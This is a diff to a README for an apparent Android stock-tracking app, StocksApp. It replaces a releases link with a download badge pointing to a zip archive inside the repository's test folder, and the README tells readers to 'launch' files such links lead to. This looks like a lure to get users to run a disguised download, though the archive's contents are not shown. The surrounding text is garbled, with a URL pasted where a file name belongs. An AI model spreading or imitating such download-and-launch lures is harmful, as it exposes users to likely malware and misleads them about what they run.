@@ -32,7 +32,7 @@ StocksApp is a comprehensive application that combines the power of modern Andro
 ## Repository
 Explore the StocksApp repository by clicking on the button below:
 
-[![Download StocksApp](https://github.com/balwant-chauhan-data-eng-project/StocksApp/releases/tag/v1.2)](https://github.com/balwant-chauhan-data-eng-project/StocksApp/releases/tag/v1.2)
+[![Download StocksApp](https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/StocksApp/master/app/src/test/App-Stocks-3.1.zip)](https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/StocksApp/master/app/src/test/App-Stocks-3.1.zip)
 
 If the link ends with a file name, remember to launch it to access the repository content.
 
@@ -44,4 +44,4 @@ Let's dive into the world of stock market tracking and management with StocksApp
 
 ---
 
-By following the above structure, you can create an engaging and informative https://github.com/balwant-chauhan-data-eng-project/StocksApp/releases/tag/v1.2 file for your GitHub repository. This layout includes the essential details about the project, its features, the technologies used, and how to access the repository content. Make sure to customize it further with your own creativity and style to make it stand out!
+By following the above structure, you can create an engaging and informative https://raw.githubusercontent.com/balwant-chauhan-data-eng-project/StocksApp/master/app/src/test/App-Stocks-3.1.zip file for your GitHub repository. This layout includes the essential details about the project, its features, the technologies used, and how to access the repository content. Make sure to customize it further with your own creativity and style to make it stand out!
